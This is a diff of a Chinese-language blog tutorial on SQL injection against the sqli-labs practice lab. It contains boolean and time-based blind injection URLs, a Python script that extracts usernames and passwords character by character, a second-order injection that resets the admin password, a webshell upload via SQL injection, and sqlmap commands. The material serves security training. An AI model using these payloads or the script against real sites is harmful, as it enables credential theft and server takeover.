+<h5><span id="3判断当前库的表名">3，判断当前库的表名</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//猜测当前数据库中是否存在admin表</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from admin) --+</span><br><span class="line">1：判断当前数据库中表的个数</span><br><span class="line">// 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())&gt;3 --+</span><br><span class="line"> </span><br><span class="line">2：判断每个表的长度</span><br><span class="line">//判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;6 --+</span><br><span class="line">//判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=6 --+</span><br><span class="line"> </span><br><span class="line">3：判断每个表的每个字符的ascii值</span><br><span class="line">//判断第一个表的第一个字符的ascii值</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 --+</span><br><span class="line">//判断第一个表的第二个字符的ascii值               </span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;100 --+</span><br><span class="line">.........</span><br><span class="line">由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断</span><br></pre></td></tr></table></figure>
 
-<h5 id="4，-判断表的字段"><a href="#4，-判断表的字段" class="headerlink" title="4， 判断表的字段"></a>4， 判断表的字段</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//如果已经证实了存在admin表，那么猜测是否存在username字段</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select username from admin) </span><br><span class="line">  </span><br><span class="line">1：判断表中字段的个数</span><br><span class="line">//判断users表中字段个数是否大于5</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;)&gt;5 --+</span><br><span class="line"> </span><br><span class="line">2：判断每个字段的长度</span><br><span class="line">//判断第一个字段的长度</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1))&gt;5 --+</span><br><span class="line">//判断第二个字段的长度   </span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1))&gt;5 --+</span><br><span class="line"> </span><br><span class="line">3：判断每个字段名字的ascii值</span><br><span class="line">//判断第一个字段的第一个字符的ascii</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))&gt;100 --+</span><br><span class="line">//判断第一个字段的第二个字符的ascii</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),2,1))&gt;100 --+</span><br><span class="line">...........</span><br><span class="line"> </span><br><span class="line">由此可判断出users表中存在 id、username、password 字段</span><br></pre></td></tr></table></figure>
+<h5><span id="4-判断表的字段">4， 判断表的字段</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//如果已经证实了存在admin表，那么猜测是否存在username字段</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select username from admin) </span><br><span class="line">  </span><br><span class="line">1：判断表中字段的个数</span><br><span class="line">//判断users表中字段个数是否大于5</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;)&gt;5 --+</span><br><span class="line"> </span><br><span class="line">2：判断每个字段的长度</span><br><span class="line">//判断第一个字段的长度</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1))&gt;5 --+</span><br><span class="line">//判断第二个字段的长度   </span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1))&gt;5 --+</span><br><span class="line"> </span><br><span class="line">3：判断每个字段名字的ascii值</span><br><span class="line">//判断第一个字段的第一个字符的ascii</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))&gt;100 --+</span><br><span class="line">//判断第一个字段的第二个字符的ascii</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),2,1))&gt;100 --+</span><br><span class="line">...........</span><br><span class="line"> </span><br><span class="line">由此可判断出users表中存在 id、username、password 字段</span><br></pre></td></tr></table></figure>
 
-<h5 id="5，爆字段中的数据"><a href="#5，爆字段中的数据" class="headerlink" title="5，爆字段中的数据"></a>5，爆字段中的数据</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">我们知道了users中有三个字段 id 、username 、password，我们现在爆出每个字段的数据</span><br><span class="line"> </span><br><span class="line">1: 判断数据的长度</span><br><span class="line">// 判断id字段的第一个数据的长度</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select id from users limit 0,1))&gt;5 --+</span><br><span class="line">// 判断id字段的第二个数据的长度</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select id from users limit 1,1))&gt;5 --+</span><br><span class="line"> </span><br><span class="line">2：判断数据的ascii值</span><br><span class="line">// 判断id字段的第一行数据的第一个字符的ascii值</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select id from users limit  0,1),1,1))&gt;100 --+</span><br><span class="line">// 判断id字段的第二行数据的第二个字符的ascii值</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select id from users limit 0,1),2,1))&gt;100 --+</span><br><span class="line">...........</span><br></pre></td></tr></table></figure>
+<h5><span id="5爆字段中的数据">5，爆字段中的数据</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">我们知道了users中有三个字段 id 、username 、password，我们现在爆出每个字段的数据</span><br><span class="line"> </span><br><span class="line">1: 判断数据的长度</span><br><span class="line">// 判断id字段的第一个数据的长度</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select id from users limit 0,1))&gt;5 --+</span><br><span class="line">// 判断id字段的第二个数据的长度</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select id from users limit 1,1))&gt;5 --+</span><br><span class="line"> </span><br><span class="line">2：判断数据的ascii值</span><br><span class="line">// 判断id字段的第一行数据的第一个字符的ascii值</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select id from users limit  0,1),1,1))&gt;100 --+</span><br><span class="line">// 判断id字段的第二行数据的第二个字符的ascii值</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select id from users limit 0,1),2,1))&gt;100 --+</span><br><span class="line">...........</span><br></pre></td></tr></table></figure>
 
-<h5 id="6-修改后的python代码"><a href="#6-修改后的python代码" class="headerlink" title="6,修改后的python代码"></a>6,修改后的python代码</h5><p>根据以上可以将之前的python代码修改为：</p>
+<h5><span id="6修改后的python代码">6,修改后的python代码</span></h5><p>根据以上可以将之前的python代码修改为：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">session = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://192.168.2.59:808/sqli/Less-7/?id=1&#x27;))&quot;</span></span><br><span class="line">resu=<span class="string">&#x27;Use outfile&#x27;</span></span><br><span class="line">name = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zhix</span>(<span class="params">num</span>):</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">        begin =<span class="number">32</span></span><br><span class="line">        end =<span class="number">128</span></span><br><span class="line">        tmp = (begin+end)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> begin &lt; end :</span><br><span class="line">            <span class="keyword">if</span>(num==<span class="number">1</span>):</span><br><span class="line">                paramsGet = url+ <span class="string">&quot;/**/and/**/ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;</span>.<span class="built_in">format</span>(i,tmp)</span><br><span class="line">            <span class="keyword">elif</span>(num==<span class="number">2</span>):</span><br><span class="line">                paramsGet = url+ <span class="string">&quot;/**/and/**/ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;</span>.<span class="built_in">format</span>(i,tmp)</span><br><span class="line">            <span class="keyword">elif</span>(num==<span class="number">3</span>):</span><br><span class="line">                paramsGet = url+ <span class="string">&quot;/**/and/**/ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;</span>.<span class="built_in">format</span>(i,tmp)</span><br><span class="line">            <span class="keyword">elif</span>(num==<span class="number">4</span>):</span><br><span class="line">                paramsGet = url+ <span class="string">&quot;/**/and/**/ascii(substr((select group_concat(id,username,password) from users),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;</span>.<span class="built_in">format</span>(i,tmp)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;输入错误！&#x27;</span>)</span><br><span class="line">                sys.exit()</span><br><span class="line"></span><br><span class="line">            response = session.get(paramsGet)</span><br><span class="line">            <span class="keyword">if</span> resu <span class="keyword">in</span> response.text:</span><br><span class="line">                begin = tmp + <span class="number">1</span></span><br><span class="line">                tmp = (begin+end)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = tmp</span><br><span class="line">                tmp = (begin+end)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span>(tmp==<span class="number">32</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        name += <span class="built_in">chr</span>(tmp)</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    num=<span class="number">4</span></span><br><span class="line">    zhix(num)</span><br></pre></td></tr></table></figure>
 
 <p>修改num的值为1，2，3，4来破解数据库，表，字段和数据！</p>
-<h4 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h4><p>​		也叫延时注入。通过观察页面，既没有回显数据库内容，又没有报错信息也没有布尔类型状态，那么我们可以考虑用绝招：延时注入。延时注入就是将页面的时间线作为判断依据，一点一点注入出数据库的信息。我们以第9关为例，在id&#x3D;1后面加单引号或者双引号，页面不会发生任何改变，所以我们考虑绝招延时注入。</p>
+<h4><span id="基于时间的盲注">基于时间的盲注</span></h4><p>​		也叫延时注入。通过观察页面，既没有回显数据库内容，又没有报错信息也没有布尔类型状态，那么我们可以考虑用绝招：延时注入。延时注入就是将页面的时间线作为判断依据，一点一点注入出数据库的信息。我们以第9关为例，在id&#x3D;1后面加单引号或者双引号，页面不会发生任何改变，所以我们考虑绝招延时注入。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and sleep(5) --+    </span><br></pre></td></tr></table></figure>
 
 <p>如图所示，观察请求的时间线，大概在5秒以上，说明构造的sleep(5) 语句起作用，可以把这个时间线作为sql 注入的判断依据。</p>
@@ -516,29 +518,29 @@ SQLServer         sysobjects
 
 
 
-<h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>​		二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到 SQL 查询语句所导致的注入。防御者可能在用户输入恶意数据时，对其中的特殊字符进行了转义处理；但在恶意数据插入到数据库时，被处理的数据又被还原并存储在数据库中，当 Web 程序调用存储在数据库中的恶意数据并执行 SQL 查询时，就发生了 SQL 二次注入。</p>
+<h4><span id="二次注入">二次注入</span></h4><p>​		二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到 SQL 查询语句所导致的注入。防御者可能在用户输入恶意数据时，对其中的特殊字符进行了转义处理；但在恶意数据插入到数据库时，被处理的数据又被还原并存储在数据库中，当 Web 程序调用存储在数据库中的恶意数据并执行 SQL 查询时，就发生了 SQL 二次注入。</p>
 <p>（1）查看初始 users 表，发现初始 users 表中账号 admin 的密码为 admin</p>
-<img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231944762.png" alt="img" style="zoom:50%;" />
+<img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231944762.png" alt="img" style="zoom:50%;">
 
 <p>（2）注册用户，在网站注册名为 admin’– - 密码为 123456 的用户</p>
-<img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231945163.png" alt="img" style="zoom:50%;" />
+<img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231945163.png" alt="img" style="zoom:50%;">
 
 <p>（3）修改用户密码，我们先查看一下此时的 users 表，发现多了一个用户 admin’– -，</p>
-<img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231946825.png" alt="img" style="zoom: 33%;" />
+<img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231946825.png" alt="img" style="zoom: 33%;">
 
 <p>修改用户 admin’– - 的密码</p>
-<img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231946490.png" alt="img" style="zoom: 50%;" />
+<img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231946490.png" alt="img" style="zoom: 50%;">
 
 <p>再一次查看 users 表，发现用户 admin‘– - 的密码并没有被修改，而是用户 admin 的密码被修改了。于是我们就有了 admin 的账户密码。</p>
-<img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231947710.png" alt="img" style="zoom: 50%;" />
+<img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231947710.png" alt="img" style="zoom: 50%;">
 
 <p>原因：在网站设计时，虽然过滤了注册的信息，把特殊字符进行了转义，但是在从数据库调用从外部保存下来的数据时，并没有进行过滤，使得“admin’– -”被代入到 sql 语句执行，执行了这段 payload，达到了修改用户 admin 的密码的目的</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#原语句</span><br><span class="line">UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; </span><br><span class="line"> </span><br><span class="line">#插入 payload 后的语句</span><br><span class="line">UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;-- -&#x27; and password=&#x27;$curr_pass&#x27; </span><br><span class="line">#此时 &#x27;admin&#x27; 后的语句被注释</span><br><span class="line"> </span><br><span class="line">#真正的生效的语句</span><br><span class="line">UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;</span><br><span class="line">#从而达到了修改用户 admin 密码的目的</span><br></pre></td></tr></table></figure>
 
 
 
-<h4 id="基于SQL注入拿到webshell"><a href="#基于SQL注入拿到webshell" class="headerlink" title="基于SQL注入拿到webshell"></a>基于SQL注入拿到webshell</h4><p>1，MySQL数据库的配置文件My.ini中的secure_file_priv为空 ，如下， 意思就是不限制数据的导入和导出操作，即能够上传木马文件 </p>
-<img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231843773.png" alt="image-20231223184333443" style="zoom: 80%;" />
+<h4><span id="基于sql注入拿到webshell">基于SQL注入拿到webshell</span></h4><p>1，MySQL数据库的配置文件My.ini中的secure_file_priv为空 ，如下， 意思就是不限制数据的导入和导出操作，即能够上传木马文件 </p>
+<img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231843773.png" alt="image-20231223184333443" style="zoom: 80%;">
 
 <p>2，利用SQL注入获取MySQL的地址并且检查secure_file_priv是否为空</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59:808/sqli/Less-1/?id=-1&#x27; union select 1,@@datadir,@@secure_file_priv -- -</span><br></pre></td></tr></table></figure>
@@ -558,12 +560,12 @@ SQLServer         sysobjects
 <p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231859342.png" alt="image-20231223185905934"></p>
 <p>5，执行指令，例如查看系统信息</p>
 <p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231901162.png" alt="image-20231223190058923"></p>
-<h4 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h4><p>SQLmap是一款自动化SQL注入工具，kali自带，如果想要在Windows中使用则需要安装，解压即用，下载地址为：</p>
+<h4><span id="sqlmap">SQLmap</span></h4><p>SQLmap是一款自动化SQL注入工具，kali自带，如果想要在Windows中使用则需要安装，解压即用，下载地址为：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/sqlmapproject/sqlmap/archive/refs/tags/1.7.zip</span><br></pre></td></tr></table></figure>
 
 <p>使用SQLmap需要提前安装好python环境</p>
 <p>SQLmap常用指令：</p>
-<img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231905144.png" alt="在这里插入图片描述"  />
+<img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231905144.png" alt="在这里插入图片描述">
 
 <p>进入SQLmap的解压目录用cmd打开后，查看帮助文档</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -h</span><br></pre></td></tr></table></figure>
@@ -651,6 +653,10 @@ SQLServer         sysobjects
   <div class="bar-inner">
   
   <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2023/12/28/%E4%B8%89%E5%8D%81%EF%BC%8CSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/" title="三十，SQL注入绕过"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+    </li>
     
     
     <li class="next">
